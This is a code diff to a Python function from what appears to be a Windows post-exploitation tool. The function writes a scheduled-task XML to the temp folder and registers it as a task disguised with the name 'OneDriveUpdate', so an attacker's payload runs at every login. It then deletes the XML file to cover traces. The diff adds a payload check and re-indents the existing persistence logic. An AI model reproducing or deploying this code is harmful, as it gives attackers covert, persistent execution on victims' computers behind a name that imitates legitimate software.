@@ -16,7 +16,8 @@ schtask_info = {
     }
 
 def schtask(payload):
-	xml_template = """<?xml version="1.0" encoding="UTF-16"?>
+	if (payloads().exe(payload) == True):
+		xml_template = """<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2018-06-09T15:45:11.0109885</Date>
@@ -64,32 +65,35 @@ def schtask(payload):
   </Actions>
 </Task>"""
 
-	if (information().admin() == True):
-		try:
-			xml_file = open(os.path.join(tempfile.gettempdir(),"elevator.xml"),"w")
-			xml_file.write(xml_template)
-			xml_file.close()
-		except Exception as error:
-			return False
-	
-		time.sleep(5)
-	
-		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"elevator.xml")) == True):
-			if process().create("schtasks /create /xml {} /tn OneDriveUpdate".format(os.path.join(tempfile.gettempdir(),"elevator.xml")),0) == True:
-				print_success("Successfully created scheduled task, payload will run at login")
-			else:
-				print_error("Unable to create scheduled task")	
-				return False
-				
-			time.sleep(5)
-
+		if (information().admin() == True):
 			try:
-				os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
+				xml_file = open(os.path.join(tempfile.gettempdir(),"elevator.xml"),"w")
+				xml_file.write(xml_template)
+				xml_file.close()
 			except Exception as error:
 				return False
+		
+			time.sleep(5)
+		
+			if (os.path.isfile(os.path.join(tempfile.gettempdir(),"elevator.xml")) == True):
+				if process().create("schtasks /create /xml {} /tn OneDriveUpdate".format(os.path.join(tempfile.gettempdir(),"elevator.xml")),0) == True:
+					print_success("Successfully created scheduled task, payload will run at login")
+				else:
+					print_error("Unable to create scheduled task")	
+					return False
+					
+				time.sleep(5)
+
+				try:
+					os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
+				except Exception as error:
+					return False
+			else:
+				print_error("Unable to create scheduled task, xml file not found")
+				return False
 		else:
-			print_error("Unable to create scheduled task, xml file not found")
+			print_error("Cannot proceed, we are not elevated")
 			return False
 	else:
-		print_error("Cannot proceed, we are not elevated")
-		return False
+		print_error("Cannot proceed, invalid payload")
+		return False							
